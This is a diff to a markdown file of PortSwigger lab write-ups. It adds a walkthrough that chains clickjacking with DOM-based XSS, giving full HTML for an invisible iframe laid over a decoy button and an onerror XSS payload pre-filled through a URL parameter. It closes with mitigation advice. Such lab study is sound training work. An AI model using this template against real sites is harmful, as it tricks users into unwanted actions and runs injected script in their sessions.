@@ -227,6 +227,60 @@ Create an HTML payload with two distinct decoy buttons and the invisible iframe 
 5. Restore opacity: 0.0001.
 
 ### Step 3: Execute the Takedown
-Deliver the exploit to the victim. The victim clicks the first decoy button, triggering the hidden modal. They then click the second decoy button, unknowingly confirming the hidden deletion prompt. Lab Solved! 🎉
+Deliver the exploit to the victim. The victim clicks the first decoy button, triggering the hidden modal. They then click the second decoy button, unknowingly confirming the hidden deletion prompt. Lab Solved! 
 
 **Key Takeaway / Mitigation:** Confirmation dialogs, modals, and multi-step workflows are UX features, not security controls against Clickjacking. If the application can be framed, an attacker can script the victim's clicks. The only robust defense remains X-Frame-Options or Content-Security-Policy: frame-ancestors.
+
+
+
+
+# 5th lab 
+
+
+
+#  Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
+**Platform:** PortSwigger Web Security Academy
+**Goal:** Chain a Clickjacking vulnerability with a DOM-based XSS vulnerability to execute JavaScript (`print()`) in the victim's browser.
+**Vulnerability:** Vulnerability Chaining (UI Redressing + DOM XSS via URL pre-filling).
+
+##  The Concept (Vulnerability Chaining)
+Often, a DOM-based XSS vulnerability might seem unexploitable if it requires the user to manually type the malicious payload into a form field and click submit. However, if the application allows form fields to be pre-filled via URL parameters (e.g., `?name=payload`), an attacker can automate the input phase. 
+To automate the execution phase (the "Submit" click), the attacker chains this with Clickjacking. The attacker frames the vulnerable form using the pre-filled URL. The victim is tricked into clicking a decoy button, which actually clicks the target form's "Submit" button, triggering the DOM XSS seamlessly.
+
+##  Step-by-Step Exploitation
+
+### Step 1: Craft the Chained Payload
+Create an HTML payload on the Exploit Server. The `src` of the iframe must point to the vulnerable form and include the XSS payload (`<img src=1 onerror=print()>`) in the vulnerable parameter (e.g., `name`). It should also pre-fill any other required fields so the form is ready to submit.
+
+```html
+<style>
+    iframe {
+        position: absolute;
+        width: 800px;
+        height: 800px;
+        top: 0;
+        left: 0;
+        opacity: 0.0001; /* Invisible cloak */
+        z-index: 2;
+    }
+    .decoy-button {
+        position: absolute;
+        top: 650px; /* Adjust for perfect alignment */
+        left: 80px; /* Adjust for perfect alignment */
+        z-index: 1;
+        padding: 10px;
+        background: red;
+        color: white;
+    }
+</style>
+<div class="decoy-button">Click to Win!</div>
+<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/feedback?name=](https://YOUR-LAB-ID.web-security-academy.net/feedback?name=)<img src=1 onerror=print()>&email=hacker@evil.com&subject=hello&message=test"></iframe>
+```
+### Step 2: Align and Deliver
+1. Temporarily set iframe opacity: 0.5 to visually align the decoy button exactly underneath the target's "Submit feedback" button.
+
+2. Once pixel-perfect alignment is achieved, restore opacity: 0.0001.
+
+3. Deliver the exploit to the victim. The victim clicks the decoy, hitting the hidden "Submit" button. The form processes the pre-filled XSS payload, executing print() in the context of the victim's session. Lab Solved! 
+
+**Key Takeaway / Mitigation:** This highlights the danger of vulnerability chaining. A "low impact" bug (like URL pre-filling) can make a "hard to exploit" bug (like self-XSS) completely weaponizable when combined with Clickjacking. Defense requires fixing the root XSS flaw and implementing robust Content-Security-Policy: frame-ancestors to prevent framing.
